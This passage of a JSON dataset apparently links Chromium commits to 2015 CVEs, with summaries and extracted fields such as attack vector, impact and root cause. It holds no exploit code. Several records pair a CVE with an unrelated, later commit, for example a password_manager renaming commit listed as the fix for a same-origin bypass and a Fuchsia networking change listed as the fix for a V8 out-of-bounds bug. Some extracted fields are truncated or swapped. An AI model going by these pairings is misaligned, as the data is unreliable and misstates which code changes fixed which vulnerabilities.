drivefs launcher client","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"e5c298b780737c53fa9aae44d6fef522931d88b0","cve_id":"CVE-2015-6765","cwe_id":null,"commit_message":"AppCache: fix a browser crashing bug that can happen during updates.\n\nBUG=558589\n\nReview URL: https:\/\/codereview.chromium.org\/1463463003\n\nCr-Commit-Position: refs\/heads\/master@{#360967}","summary":"Use-after-free vulnerability in content\/browser\/appcache\/appcache_update_job.cc in Google Chrome before 47.0.2526.73 allows remote attackers to execute arbitrary code or cause a denial of service by leveraging the mishandling of AppCache update jobs.","commit_message_1":"fix a browser crashing bug that can happen during update","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging the mishandling of appcache update jobs","Impact":"execute arbitrary code or cause a denial of service","Root Cause":"caused by a use-after-free error within AppCache","Attack Type":"remote attacker"},{"commit_id":"2cb006bc9d3ad16353ed49c2b75faea618156d0f","cve_id":"CVE-2015-6766","cwe_id":null,"commit_message":"Fix possible map::end() dereference in AppCacheUpdateJob triggered by a compromised renderer.\n\nBUG=551044\n\nReview URL: https:\/\/codereview.chromium.org\/1418783005\n\nCr-Commit-Position: refs\/heads\/master@{#358815}","summary":"Use-after-free vulnerability in the AppCache implementation in Google Chrome before 47.0.2526.73 allows remote attackers with renderer access to cause a denial of service or possibly have unspecified other impact by leveraging incorrect AppCacheUpdateJob behavior associated with duplicate cache selection.","commit_message_1":"dereference in appcacheupdatejob triggered by a compromised renderer","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging incorrect appcacheupdatejob behavior associated with duplicate cache selection","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within AppCache","Attack Type":"remote attacker"},{"commit_id":"4b5eefe562bd45c059f5dd93079450db5610788a","cve_id":"CVE-2015-6767","cwe_id":null,"commit_message":"AppCache: Use WeakPtr<> to fix a potential uaf bug.\n\nBUG=554908\n\nReview URL: https:\/\/codereview.chromium.org\/1441683004\n\nCr-Commit-Position: refs\/heads\/master@{#359930}","summary":"Use-after-free vulnerability in content\/browser\/appcache\/appcache_dispatcher_host.cc in the AppCache implementation in Google Chrome before 47.0.2526.73 allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging incorrect pointer maintenance associated with certain callbacks.","commit_message_1":"use weakptr < > to fix a potential uaf bug","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging incorrect pointer maintenance associated with certain callbacks","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within AppCache","Attack Type":"remote attacker"},{"commit_id":"33c5e0a9db05dbd2f7793c23ac23b7aa6a556c05","cve_id":"CVE-2015-6769","cwe_id":"CWE-264","commit_message":"Fixing names of password_manager kEnableManualFallbacksFilling feature.\n\nFixing  names of password_manager kEnableManualFallbacksFilling feature\nas per the naming convention.\n\nBug: 785953\nChange-Id: I4a4baa1649fe9f02c3783a5e4c40bc75e717cc03\nReviewed-on: https:\/\/chromium-review.googlesource.com\/900566\nReviewed-by: Vaclav Brozek <vabr@chromium.org>\nCommit-Queue: NIKHIL SAHNI <nikhil.sahni@samsung.com>\nCr-Commit-Position: refs\/heads\/master@{#534923}","summary":"The provisional-load commit implementation in WebKit\/Source\/bindings\/core\/v8\/WindowProxy.cpp in Google Chrome before 47.0.2526.73 allows remote attackers to bypass the Same Origin Policy by leveraging a delay in window proxy clearing.","commit_message_1":"fixing name of password_manager kenablemanualfallbacksfilling feature","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging a delay in window proxy clearing","Impact":"bypass the same origin policy","Root Cause":"caused by an error related to core","Attack Type":"remote attacker"},{"commit_id":"f7b2214a08547e0d28b1a2fef3c19ee0f9febd19","cve_id":"CVE-2015-6764","cwe_id":"CWE-119","commit_message":"Reland \"[Fuchsia] Use Netstack FIDL interface to get network interfaces.\"\n\nThis is a reland of b29fc269716e556be6b4e999bb4b24332cc43c6e\n\nOriginal change's description:\n> [Fuchsia] Use Netstack FIDL interface to get network interfaces.\n>\n> 1. Updated FILD GN template to generate and compile tables file, FIDL\n>    generated code was failing to link without them.\n> 2. Updated GetNetworkList() for Fuchsia to FIDL API instead of ioctl().\n>\n> Bug: 831384\n> Change-Id: Ib90303a5110a465ea5f2bad787a7b63a2bf13f61\n> Reviewed-on: https:\/\/chromium-review.googlesource.com\/1023124\n> Commit-Queue: Sergey Ulanov <sergeyu@chromium.org>\n> Reviewed-by: James Robinson <jamesr@chromium.org>\n> Reviewed-by: Matt Menke <mmenke@chromium.org>\n> Cr-Commit-Position: refs\/heads\/master@{#554868}\n\nTBR=mmenke@chromium.org\n\nBug: 831384\nChange-Id: Iabb29661680b835b947b2780d169e204fd5e2559\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1036484\nCommit-Queue: Sergey Ulanov <sergeyu@chromium.org>\nReviewed-by: Kevin Marshall <kmarshall@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#554946}","summary":"The BasicJsonStringifier::SerializeJSArray function in json-stringifier.h in the JSON stringifier in Google V8, as used in Google Chrome before 47.0.2526.73, improperly loads array elements, which allows remote attackers to cause a denial of service (out-of-bounds memory access) or possibly have unspecified other impact via crafted JavaScript code.","commit_message_1":"reland `` [ fuchsia ] use netstack fidl interface to get network interface","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted javascript code","Impact":"cause a denial of service ( out - of - bounds memory access ) or possibly have unspecified other impact","Root Cause":"caused by an error when user-supplied JavaScript is executed by an application","Attack Type":"remote attacker"},{"commit_id":"33827275411b33371e7bb750cce20f11de85002d","cve_id":"CVE-2015-6773","cwe_id":"CWE-119","commit_message":"Move SelectionTemplate::is_handle_visible_ to FrameSelection\n\nThis patch moves |is_handle_visible_| to |FrameSelection| from |SelectionTemplate|\nsince handle visibility is used only for setting |FrameSelection|, hence it is\na redundant member variable of |SelectionTemplate|.\n\nBug: 742093\nChange-Id: I3add4da3844fb40be34dcb4d4b46b5fa6fed1d7e\nReviewed-on: https:\/\/chromium-review.googlesource.com\/595389\nCommit-Queue: Yoshifumi Inoue <yosin@chromium.org>\nReviewed-by: Xiaocheng Hu <xiaochengh@chromium.org>\nReviewed-by: Kent Tamura <tkent@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#491660}","summary":"The convolution implementation in Skia, as used in Google Chrome before 47.0.2526.73, does not properly constrain row lengths, which allows remote attackers to cause a denial of service (out-of-bounds memory access) or possibly have unspecified other impact via crafted graphics data.","commit_message_1":"to frameselection this patch move |is_handle_visible_| to |frameselection| from |selectiontemplate| since handle visibility is used only for setting |frameselection| , hence it is a redundant member variable of |selectiontemplate|","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted graphics data","Impact":"cause a denial of service ( out - of - bounds memory access ) or possibly have unspecified other impact","Root Cause":"does not properly constrain row lengths","Attack Type":"remote attacker"},{"commit_id":"53f1c0f95e568d4b6b184904f98cfde2833c603c","cve_id":"CVE-2015-6775","cwe_id":null,"commit_message":"Support negative timestamps of TextTrackCue\n\nEnsure proper behaviour for negative timestamps of TextTrackCue.\n1. Cues with negative startTime should become active from 0s.\n2. Cues with negative startTime and endTime should never be active.\n\nBug: 314032\nChange-Id: Ib53710e58be0be770c933ea8c3c4709a0e5dec0d\nReviewed-on: https:\/\/chromium-review.googlesource.com\/863270\nCommit-Queue: srirama chandra sekhar <srirama.m@samsung.com>\nReviewed-by: Fredrik S\u00f6derquist <fs@opera.com>\nCr-Commit-Position: refs\/heads\/master@{#529012}","summary":"fpdfsdk\/src\/jsapi\/fxjs_v8.cpp in PDFium, as used in Google Chrome before 47.0.2526.73, does not use signatures, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that leverage *type confusion.*","commit_message_1":"support negative timestamps of texttrackcue ensure proper behaviour for negative timestamps of texttrackcue","Vulnerability Type":"unspecified","Attack Vector":"via vectors that leverage * type confusion","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not use signatures","Attack Type":"remote attacker"},{"commit_id":"1eefa26e1795192c5a347a1e1e7a99e88c47f9c4","cve_id":"CVE-2015-6779","cwe_id":"CWE-264","commit_message":"This patch implements a mechanism for more granular link URL permissions (filtering on scheme\/host). This fixes the bug that allowed PDFs to have working links to any \"chrome:\/\/\" URLs.\n\nBUG=528505,226927\n\nReview URL: https:\/\/codereview.chromium.org\/1362433002\n\nCr-Commit-Position: refs\/heads\/master@{#351705}","summary":"PDFium, as used in Google Chrome before 47.0.2526.73, does not properly restrict use of chrome: URLs, which allows remote attackers to bypass intended scheme restrictions via a crafted PDF document, as demonstrated by a document with a link to a chrome:\/\/settings URL.","commit_message_1":"this patch implement a mechanism for more granular link url permission ( filtering on scheme\/host )","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted pdf document , as demonstrated by a document with a link to a chrome : \/ \/ settings url","Impact":"bypass intended scheme restrictions","Root Cause":"does not properly restrict use of chrome : urls","Attack Type":"remote attacker"},{"commit_id":"f2cba0d13b3a6d76dedede66731e5ca253d3b2af","cve_id":"CVE-2015-6780","cwe_id":null,"commit_message":"Fix UAF in Origin Info Bubble and permission settings UI.\n\nIn addition to fixing the UAF, will this also fix the problem of the bubble\nshowing over the previous tab (if the bubble is open when the tab it was opened\nfor closes).\n\nBUG=490492\nTBR=tedchoc\n\nReview URL: https:\/\/codereview.chromium.org\/1317443002\n\nCr-Commit-Position: refs\/heads\/master@{#346023}","summary":"Use-after-free vulnerability in the Infobars implementation in Google Chrome before 47.0.2526.73 allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted web site, related to browser\/ui\/views\/website_settings\/website_settings_popup_view.cc.","commit_message_1":"fix uaf in origin info bubble and permission setting ui","Vulnerability Type":"use - after - free","Attack Vector":"via a crafted web site , related to browser \/ ui \/ views \/ website _ settings \/ website _ settings _ popup _ view . cc .","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within Infobars","Attack Type":"remote attacker"},{"commit_id":"e1e0c4301aaa8228e362f2409dbde2d4d1896866","cve_id":"CVE-2015-6782","cwe_id":"CWE-20","commit_message":"Don't change Document load progress in any page dismissal events.\n\nThis can confuse the logic for blocking modal dialogs.\n\nBUG=536652\n\nReview URL: https:\/\/codereview.chromium.org\/1373113002\n\nCr-Commit-Position: refs\/heads\/master@{#351419}","summary":"The Document::open function in WebKit\/Source\/core\/dom\/Document.cpp in Google Chrome before 47.0.2526.73 does not ensure that page-dismissal event handling is compatible with modal-dialog blocking, which makes it easier for remote attackers to spoof Omnibox content via a crafted web site.","commit_message_1":"do n't change document load progress in any page dismissal event","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted web site","Impact":"spoof omnibox content","Root Cause":"does not ensure that page - dismissal event handling is compatible with modal - dialog blocking","Attack Type":"remote attacker"},{"commit_id":"d9e316238aee59acf665d80b544cf4e1edfd3349","cve_id":"CVE-2015-6783","cwe_id":"CWE-20","commit_message":"crazy linker: Alter search for zip EOCD start\n\nWhen loading directly from APK, begin searching backwards\nfor the zip EOCD record signature at size of EOCD record\nbytes before the end of the file.\n\nBUG=537205\nR=rmcilroy@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/1390553002 .\n\nCr-Commit-Position: refs\/heads\/master@{#352577}","summary":"The FindStartOffsetOfFileInZipFile function in crazy_linker_zip.cpp in crazy_linker (aka Crazy Linker) in Android 5.x and 6.x, as used in Google Chrome before 47.0.2526.73, improperly searches for an EOCD record, which allows attackers to bypass a signature-validation requirement via a crafted ZIP archive.","commit_message_1":"alter search for zip eocd start when loading directly from apk , begin searching backwards for the zip eocd record signature at size of eocd record byte before the end of the file","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted zip archive","Impact":"bypass a signature - validation","Root Cause":"searches for an eocd record","Attack Type":"remote attacker"},{"commit_id":"a81593e7f162428585832ac8f6e71f75592b53e7","cve_id":"CVE-2015-6784","cwe_id":"CWE-20","commit_message":"Escape \"--\" in the page URL at page serialization\n\nThis patch makes page serializer to escape the page URL embed into a HTML\ncomment of result HTML[1] to avoid inserting text as HTML from URL by\nintroducing a static member function |PageSerialzier::markOfTheWebDeclaration()|\nfor sharing it between |PageSerialzier| and |WebPageSerialzier| classes.\n\n[1] We use following format for serialized HTML:\nsaved from url=(${lengthOfURL})${URL}\n\nBUG=503217\nTEST=webkit_unit_tests --gtest_filter=PageSerializerTest.markOfTheWebDeclaration\nTEST=webkit_unit_tests --gtest_filter=WebPageSerializerTest.fromUrlWithMinusMinu\n\nReview URL: https:\/\/codereview.chromium.org\/1371323003\n\nCr-Commit-Position: refs\/heads\/master@{#351736}","summary":"The page serializer in Google Chrome before 47.0.2526.73 mishandles Mark of the Web (MOTW) comments for URLs containing a *--* sequence, which might allow remote attackers to inject HTML via a crafted URL, as demonstrated by an initial http:\/\/example.com?-- substring.","commit_message_1":"escape `` -- '' in the page url at page serialization this patch make page serializer to escape the page url embed into a html comment of result html [ <number> ] to avoid inserting text a html from url by introducing a static member function |pageserialzier : :markofthewebdeclaration ( ) | for sharing it between |pageserialzier| and |webpageserialzier| class","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted url , as demonstrated by an initial http : \/ \/ example . com","Impact":"bypass security restrictions","Root Cause":"caused by an error related to escaping issue","Attack Type":"remote attacker"},{"commit_id":"5d0e9f824e05523e03dabc0e341b9f8f17a72bb0","cve_id":"CVE-2015-6786","cwe_id":"CWE-264","commit_message":"Disallow CSP source * matching of data:, blob:, and filesystem: URLs\n\nThe CSP spec specifically excludes matching of data:, blob:, and\nfilesystem: URLs with the source '*' wildcard. This adds checks to make\nsure that doesn't happen, along with tests.\n\nBUG=534570\nR=mkwst@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/1361763005\n\nCr-Commit-Position: refs\/heads\/master@{#350950}","summary":"The CSPSourceList::matches function in WebKit\/Source\/core\/frame\/csp\/CSPSourceList.cpp in the Content Security Policy (CSP) implementation in Google Chrome before 47.0.2526.73 accepts a blob:, data:, or filesystem: URL as a match for a * pattern, which allows remote attackers to bypass intended scheme restrictions in opportunistic circumstances by leveraging a policy that relies on this pattern.","commit_message_1":"disallow csp source * matching of data : , blob : , and filesystem : url the csp spec specifically excludes matching of data : , blob : , and filesystem : url with the source ' * ' wildcard","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"opportunistic circumstances by leveraging","Impact":"bypass intended scheme restrictions in","Root Cause":"caused by an error related to CSP","Attack Type":"remote attacker"},{"commit_id":"f911e11e7f6b5c0d6f5ee694a9871de6619889f7","cve_id":"CVE-2015-6787","cwe_id":null,"commit_message":"Reland \"[CI] Make paint property nodes non-ref-counted\"\n\nThis reverts commit 887383b30842d9d9006e11bb6932660a3cb5b1b7.\n\nReason for revert: Retry in M69.\n\nOriginal change's description:\n> Revert \"[CI] Make paint property nodes non-ref-counted\"\n>\n> This reverts commit 70fc0b018c9517558b7aa2be00edf2debb449123.\n>\n> Reason for revert: Caused bugs found by clusterfuzz\n>\n> Original change's description:\n> > [CI] Make paint property nodes non-ref-counted\n> >\n> > Now all paint property nodes are owned by ObjectPaintProperties\n> > (and LocalFrameView temporarily before removing non-RLS mode).\n> > Others just use raw pointers or references.\n> >\n> > Bug: 833496\n> > Cq-Include-Trybots: master.tryserver.blink:linux_trusty_blink_rel;master.tryserver.chromium.linux:linux_layout_tests_slimming_paint_v2\n> > Change-Id: I2d544fe153bb94698623248748df63c8aa2081ae\n> > Reviewed-on: https:\/\/chromium-review.googlesource.com\/1031101\n> > Reviewed-by: Tien-Ren Chen <trchen@chromium.org>\n> > Commit-Queue: Xianzhu Wang <wangxianzhu@chromium.org>\n> > Cr-Commit-Position: refs\/heads\/master@{#554626}\n>\n> TBR=wangxianzhu@chromium.org,trchen@chromium.org,chrishtr@chromium.org\n>\n> Change-Id: I02bb50d6744cb81a797246a0116b677e80a3c69f\n> No-Presubmit: true\n> No-Tree-Checks: true\n> No-Try: true\n> Bug: 833496,837932,837943\n> Cq-Include-Trybots: master.tryserver.blink:linux_trusty_blink_rel;master.tryserver.chromium.linux:linux_layout_tests_slimming_paint_v2\n> Reviewed-on: https:\/\/chromium-review.googlesource.com\/1034292\n> Reviewed-by: Xianzhu Wang <wangxianzhu@chromium.org>\n> Commit-Queue: Xianzhu Wang <wangxianzhu@chromium.org>\n> Cr-Commit-Position: refs\/heads\/master@{#554653}\n\nTBR=wangxianzhu@chromium.org,trchen@chromium.org,chrishtr@chromium.org\n\n# Not skipping CQ checks because original CL landed > 1 day ago.\n\nBug: 833496, 837932, 837943\nChange-Id: I0b4ef70db1f1f211ba97c30d617225355c750992\nCq-Include-Trybots: master.tryserver.blink:linux_trusty_blink_rel;master.tryserver.chromium.linux:linux_layout_tests_slimming_paint_v2\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1083491\nCommit-Queue: Xianzhu Wang <wangxianzhu@chromium.org>\nReviewed-by: Xianzhu Wang <wangxianzhu@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#563930}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 47.0.2526.73 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"reland `` [ ci ] make paint property node non-ref-counted '' this reverts commit 887383b30842d9d9006e11bb6932660a3cb5b1b7","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"c71a21e6dda9025c2bf823c5aab791c2ae8cdfc2","cve_id":"CVE-2015-6755","cwe_id":"CWE-264","commit_message":"parserInsertBefore: Bail out if the parent no longer contains the child.\n\nnextChild may be removed from the DOM tree during the\n|parserRemoveChild(*newChild)| call which triggers unload events of newChild's \ndescendant iframes. In order to maintain the integrity of the DOM tree, the\ninsertion of newChild must be aborted in this case.\n\nThis patch adds a return statement that rectifies the behavior in this\nedge case.\n\nBUG=519558\n\nReview URL: https:\/\/codereview.chromium.org\/1283263002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@200690 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The ContainerNode::parserInsertBefore function in core\/dom\/ContainerNode.cpp in Blink, as used in Google Chrome before 46.0.2490.71, proceeds with a DOM tree insertion in certain cases where a parent node no longer contains a child node, which allows remote attackers to bypass the Same Origin Policy via crafted JavaScript code.","commit_message_1":"bail out if the parent no longer contains the child","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via crafted javascript code","Impact":"bypass the same origin","Root Cause":"longer contains a child node","Attack Type":"remote attacker"},{"commit_id":"37b83877e63f62f8aebb337494f1116539182bdf","cve_id":"CVE-2015-6757","cwe_id":null,"commit_message":"Fix crash during EmbeddedWorkerInstance startup sequence failures\n\nOnce EWInstance startup calls the callback, it's possible that the\nunderlying ServiceWorkerVersion is destroyed, hence destroying\n|this|. We must guard against that.\n\nAlso some failure points in the startup sequence weren't calling\nOnStopped() as expected.\n\nBUG=529520, 531345\n\nReview URL: https:\/\/codereview.chromium.org\/1327723005\n\nCr-Commit-Position: refs\/heads\/master@{#349368}","summary":"Use-after-free vulnerability in content\/browser\/service_worker\/embedded_worker_instance.cc in the ServiceWorker implementation in Google Chrome before 46.0.2490.71 allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging object destruction in a callback.","commit_message_1":"fix crash during embeddedworkerinstance startup sequence failure once ewinstance startup call the callback , it 's possible that the underlying serviceworkerversion is destroyed , hence destroying |this|","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging object destruction in a callback","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within ServiceWorker","Attack Type":"remote attacker"},{"commit_id":"fd506b0ac6c7846ae45b5034044fe85c28ee68ac","cve_id":"CVE-2015-6761","cwe_id":"CWE-362","commit_message":"Fix detach with open()ed document leaving parent loading indefinitely\n\nChange-Id: I26c2a054b9f1e5eb076acd677e1223058825f6d6\n\nBug: 803416\nTest: fast\/loader\/document-open-iframe-then-detach.html\nChange-Id: I26c2a054b9f1e5eb076acd677e1223058825f6d6\nReviewed-on: https:\/\/chromium-review.googlesource.com\/887298\nReviewed-by: Mike West <mkwst@chromium.org>\nCommit-Queue: Nate Chapin <japhet@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#532967}","summary":"The update_dimensions function in libavcodec\/vp8.c in FFmpeg through 2.8.1, as used in Google Chrome before 46.0.2490.71 and other products, relies on a coefficient-partition count during multi-threaded operation, which allows remote attackers to cause a denial of service (race condition and memory corruption) or possibly have unspecified other impact via a crafted WebM file.","commit_message_1":"fix detach with open ( ) ed document leaving parent loading indefinitely","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted webm file","Impact":"cause a denial of service ( race condition and memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"f1574f25e1402e748bf2bd7e28ce3dd96ceb1ca4","cve_id":"CVE-2015-6763","cwe_id":null,"commit_message":"MacViews: Enable secure text input for password Textfields.\n\nIn Cocoa the NSTextInputContext automatically enables secure text input\nwhen activated and it's in the secure text entry mode.\n\nRenderWidgetHostViewMac did the similar thing for ages following the\nWebKit example.\n\nviews::Textfield needs to do the same thing in a fashion that's\nsycnrhonized with RenderWidgetHostViewMac, otherwise the race conditions\nare possible when the Textfield gets focus, activates the secure text\ninput mode and the RWHVM loses focus immediately afterwards and disables\nthe secure text input instead of leaving it in the enabled state.\n\nBUG=818133,677220\n\nChange-Id: I6db6c4b59e4a1a72cbb7f8c7056f71b04a3df08b\nReviewed-on: https:\/\/chromium-review.googlesource.com\/943064\nCommit-Queue: Michail Pishchagin <mblsha@yandex-team.ru>\nReviewed-by: Pavel Feldman <pfeldman@chromium.org>\nReviewed-by: Avi Drissman <avi@chromium.org>\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#542517}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 46.0.2490.71 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"enable secure text input for password textfields","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"7ee897723127d0b8fecc5e67d45e20179c760e6e","cve_id":"CVE-2015-1292","cwe_id":"CWE-264","commit_message":"Add ASSERT() to avoid accidental leaking ServiceWorkerContainer to cross origin context.\n\nBUG=522791\n\nReview URL: https:\/\/codereview.chromium.org\/1305903007\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@201889 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The NavigatorServiceWorker::serviceWorker function in modules\/serviceworkers\/NavigatorServiceWorker.cpp in Blink, as used in Google Chrome before 45.0.2454.85, allows remote attackers to bypass the Same Origin Policy by accessing a Service Worker.","commit_message_1":"add assert ( ) to avoid accidental leaking serviceworkercontainer to cross origin context","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by accessing a service worker","Impact":"bypass the same origin policy","Root Cause":"caused by an error related to ServiceWorker","Attack Type":"remote attacker"},{"commit_id":"3ff403eecdd23a39853a4ebca52023fbba6c5d00","cve_id":"CVE-2015-1294","cwe_id":null,"commit_message":"Introduce RunLoop::Type::NESTABLE_TASKS_ALLOWED to replace MessageLoop::ScopedNestableTaskAllower.\n\n(as well as MessageLoop::SetNestableTasksAllowed())\n\nSurveying usage: the scoped object is always instantiated right before\nRunLoop().Run(). The intent is really to allow nestable tasks in that\nRunLoop so it's better to explicitly label that RunLoop as such and it\nallows us to break the last dependency that forced some RunLoop users\nto use MessageLoop APIs.\n\nThere's also the odd case of allowing nestable tasks for loops that are\nreentrant from a native task (without going through RunLoop), these\nare the minority but will have to be handled (after cleaning up the\nmajority of cases that are RunLoop induced).\nAs highlighted by robliao@ in https:\/\/chromium-review.googlesource.com\/c\/600517\n(which was merged in this CL).\n\nR=danakj@chromium.org\n\nBug: 750779\nChange-Id: I43d122c93ec903cff3a6fe7b77ec461ea0656448\nReviewed-on: https:\/\/chromium-review.googlesource.com\/594713\nCommit-Queue: Gabriel Charette <gab@chromium.org>\nReviewed-by: Robert Liao <robliao@chromium.org>\nReviewed-by: danakj <danakj@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#492263}","summary":"Use-after-free vulnerability in the SkMatrix::invertNonIdentity function in core\/SkMatrix.cpp in Skia, as used in Google Chrome before 45.0.2454.85, allows remote attackers to cause a denial of service or possibly have unspecified other impact by triggering the use of matrix elements that lead to an infinite result during an inversion calculation.","commit_message_1":"to replace messageloop : :scopednestabletaskallower","Vulnerability Type":"use - after - free","Attack Vector":"by triggering the use of matrix elements that lead to an infinite result during an inversion calculation","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within Skia","Attack Type":"remote attacker"},{"commit_id":"8fa5a358cb32085b51daf92df8fd4a79b3931f81","cve_id":"CVE-2015-1295","cwe_id":null,"commit_message":"Crash on nested IPC handlers in PrintWebViewHelper\n\nClass is not designed to handle nested IPC. Regular flows also does not\nexpect them. Still during printing of plugging them may show message\nboxes and start nested message loops.\nFor now we are going just crash. If stats show us that this case is\nfrequent we will have to do something more complicated.\n\nBUG=502562\n\nReview URL: https:\/\/codereview.chromium.org\/1228693002\n\nCr-Commit-Position: refs\/heads\/master@{#338100}","summary":"Multiple use-after-free vulnerabilities in the PrintWebViewHelper class in components\/printing\/renderer\/print_web_view_helper.cc in Google Chrome before 45.0.2454.85 allow user-assisted remote attackers to cause a denial of service or possibly have unspecified other impact by triggering nested IPC messages during preparation for printing, as demonstrated by messages associated with PDF documents in conjunction with messages about printer capabilities.","commit_message_1":"crash on nested ipc handler in printwebviewhelper class is not designed to handle nested ipc","Vulnerability Type":"use - after - free","Attack Vector":"by triggering nested ipc messages during preparation for printing , as demonstrated by messages associated with pdf documents in conjunction with messages about printer capabilities","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"by triggering nested IPC messages during preparation for printing","Attack Type":"remote attacker"},{"commit_id":"86154b409eed6ea7f9177f6bf576e76533ab2f7b","cve_id":"CVE-2015-1297","cwe_id":"CWE-254","commit_message":"Hide requests in an extension from other extensions\n\nBUG=510802\n\nReview URL: https:\/\/codereview.chromium.org\/1267183003\n\nCr-Commit-Position: refs\/heads\/master@{#341939}","summary":"The WebRequest API implementation in extensions\/browser\/api\/web_request\/web_request_api.cc in Google Chrome before 45.0.2454.85 does not properly consider a request's source before accepting the request, which allows remote attackers to bypass intended access restrictions via a crafted (1) app or (2) extension.","commit_message_1":"hide request in an extension from other extension bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Security Features","Attack Vector":"via a crafted ( 1 ) app or ( 2 ) extension","Impact":"bypass intended access restrictions","Root Cause":"does not properly consider a request ' s source before accepting the request","Attack Type":"remote attacker"},{"commit_id":"1810bb5cec9026c64fc34fbbb8fafd01263241d2","cve_id":"CVE-2015-1299","cwe_id":null,"commit_message":"Disable forwarding tasks to the Blink scheduler\n\nDisable forwarding tasks to the Blink scheduler to avoid some\nregressions which it has introduced.\n\nBUG=391005,415758,415478,412714,416362,416827,417608\nTBR=jamesr@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/609483002\n\nCr-Commit-Position: refs\/heads\/master@{#296916}","summary":"Use-after-free vulnerability in the shared-timer implementation in Blink, as used in Google Chrome before 45.0.2454.85, allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging erroneous timer firing, related to ThreadTimers.cpp and Timer.cpp.","commit_message_1":"disable forwarding task to the blink scheduler disable forwarding task to the blink scheduler to avoid some regression which it ha introduced","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging erroneous timer firing , related to threadtimers . cpp and timer . cpp","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within Blink","Attack Type":"remote attacker"},{"commit_id":"9c391ac04f9ac478c8b0e43b359c2b43a6c892ab","cve_id":"CVE-2015-1300","cwe_id":"CWE-254","commit_message":"Use pdf compositor service for printing when OOPIF is enabled\n\nWhen OOPIF is enabled (by site-per-process flag or\ntop-document-isolation feature), use the pdf compositor service for\nconverting PaintRecord to PDF on renderers.\n\nIn the future, this will make compositing PDF from multiple renderers\npossible.\n\nTBR=jzfeng@chromium.org\nBUG=455764\n\nChange-Id: I3c28f03f4358e4228239fe1a33384f85e7716e8f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/699765\nCommit-Queue: Wei Li <weili@chromium.org>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nReviewed-by: Lei Zhang <thestig@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#511616}","summary":"The FrameFetchContext::updateTimingInfoForIFrameNavigation function in core\/loader\/FrameFetchContext.cpp in Blink, as used in Google Chrome before 45.0.2454.85, does not properly restrict the availability of IFRAME Resource Timing API times, which allows remote attackers to obtain sensitive information via crafted JavaScript code that leverages a history.back call.","commit_message_1":"use pdf compositor service for printing when oopif is enabled when oopif is enabled ( by site-per-process flag or top-document-isolation feature ) , use the pdf compositor service for converting paintrecord to pdf on renderers","Vulnerability Type":"Security Features","Attack Vector":"crafted javascript code that leverages a history . back call","Impact":"to obtain sensitive information via","Root Cause":"does not properly restrict the availability of iframe resource timing api times","Attack Type":"remote attacker"},{"commit_id":"616568a633a3e2ae10537d14d3944d87ec382b8f","cve_id":"CVE-2015-1301","cwe_id":null,"commit_message":"Fix nullptr crash in IsSiteMuted\n\nThis CL adds a nullptr check in IsSiteMuted to prevent a crash on Mac.\n\nBug: 797647\nChange-Id: 